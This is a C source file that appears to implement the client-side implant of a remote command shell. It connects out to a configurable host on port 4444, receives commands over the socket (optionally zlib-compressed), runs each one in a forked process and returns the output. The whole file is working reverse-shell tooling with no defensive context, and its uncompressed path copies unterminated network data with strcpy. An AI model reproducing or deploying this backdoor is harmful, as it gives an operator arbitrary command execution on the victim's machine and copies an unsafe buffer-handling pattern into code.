#include <zlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include "server_fn/socket_related.h"
#include "server_fn/options_related.h"
#include "general_fn/error_handling.h"
#include "server_fn/pipe_io_with_fork.h"
#include "general_fn/compress_related.h"
#include "general_fn/conversion_related.h"

#define BUFFER_SIZE 16384
#define HOST "127.0.0.1"
int PORT = 4444;

int main(int argc, char* argv[]) {
    test_if_options_passed_server(argc, argv, &PORT);

    int socket = connect_socket_server(HOST, PORT);
    printf("[+]Connection with Client was Established.\n\033[0m");
    
    int COMPRESS;
    if (recv(socket, &COMPRESS, sizeof(int), 0) == -1) error_output("Could Not Receive");

    char command[BUFFER_SIZE];
    
    char output[BUFFER_SIZE];

    while (1) {
        if (COMPRESS) {
            ulong command_size;
            ulong command_byte_size;

            if (recv(socket, &command_size, sizeof(ulong), 0) == -1) error_output("Could Not Send");
            if (recv(socket, &command_byte_size, sizeof(ulong), 0) == -1) error_output("Could Not Send");

            char* command = (char*)malloc(command_byte_size * sizeof(char));

            if (recv(socket, command, command_byte_size, 0) == -1) error_output("Could Not Send");

            char* tmp = uncompress_buffer(command, command_size, command_byte_size);

            if (strcmp(tmp, "") == 0) {
                printf("\033[34m[+]Client Disconnected.\n");
                break;
            }

            command_output_with_fork(tmp, output, BUFFER_SIZE);
            
            ulong output_size = strlen(output) * sizeof(char) + 1;
            ulong output_byte_size = compressBound(output_size);

            char* output_compressed = compress_buffer(output, output_size, output_byte_size);

            if (send(socket, &output_size, sizeof(ulong), 0) == -1) error_output("Could Not Send");
            if (send(socket, &output_byte_size, sizeof(ulong), 0) == -1) error_output("Could Not Send");
            if (send(socket, output_compressed, output_byte_size, 0) == -1) error_output("Could Not Send");

            bzero(tmp, command_size);
            bzero(command, command_byte_size);
            bzero(output_compressed, output_byte_size);
            free(output_compressed);
            free(command);
            free(tmp);
        } else {
            if (recv(socket, command, BUFFER_SIZE, 0) == -1) error_output("Could Not Receive");

            if (strcmp(command, "") == 0) {
                printf("\033[34m[+]Client Disconnected.\n");
                break;
            }

            char tmp[BUFFER_SIZE];
            strcpy(tmp, command);

            printf("\033[34m[+]Received Command: \033[32m%s\n", tmp);

            command_output_with_fork(tmp, output, BUFFER_SIZE);

            if (send(socket, output, strlen(output), 0) == -1) error_output("Could Not Send");
            
            bzero(tmp, BUFFER_SIZE);
            bzero(command, BUFFER_SIZE);
        }
        bzero(output, BUFFER_SIZE);
        printf("\033[34m[+]Sent Output.\n");
    }
    return 0;
}